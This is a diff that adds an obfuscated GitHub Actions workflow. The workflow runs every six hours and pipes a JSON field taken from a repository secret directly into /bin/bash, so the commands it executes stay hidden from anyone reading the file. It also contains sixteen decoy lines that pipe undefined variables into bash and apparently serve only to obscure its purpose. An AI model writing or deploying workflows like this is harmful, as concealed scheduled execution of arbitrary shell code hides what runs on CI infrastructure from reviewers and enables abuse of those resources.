@@ -1,0 +1,34 @@
+name: haofengshengna
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haofengshengna
+        env:
+          ldhf7: ${{ secrets.ldhf7 }}
+        run: |
+          echo $ldhf7 | jq -r .b10502 | /bin/bash
+          echo $gxqrp5 | jq -r .llss90 | /bin/bash
+          echo $qrvb742 | jq -r .u3091 | /bin/bash
+          echo $pm89 | jq -r .bmli2555 | /bin/bash
+          echo $k50 | jq -r .tgv8 | /bin/bash
+          echo $n0 | jq -r .zknu295 | /bin/bash
+          echo $nfobt82 | jq -r .qsfso093 | /bin/bash
+          echo $kj144 | jq -r .gnm5976 | /bin/bash
+          echo $q11 | jq -r .z29153 | /bin/bash
+          echo $ev20118 | jq -r .z214 | /bin/bash
+          echo $dd98180 | jq -r .rm8 | /bin/bash
+          echo $pxxir1714 | jq -r .jubbm32 | /bin/bash
+          echo $sn1 | jq -r .vpz3 | /bin/bash
+          echo $lzo8772 | jq -r .y0 | /bin/bash
+          echo $ui2349 | jq -r .etwv2 | /bin/bash
+          echo $hgmef1260 | jq -r .kbi22757 | /bin/bash
+          echo $oz9 | jq -r .xjt1872 | /bin/bash
+
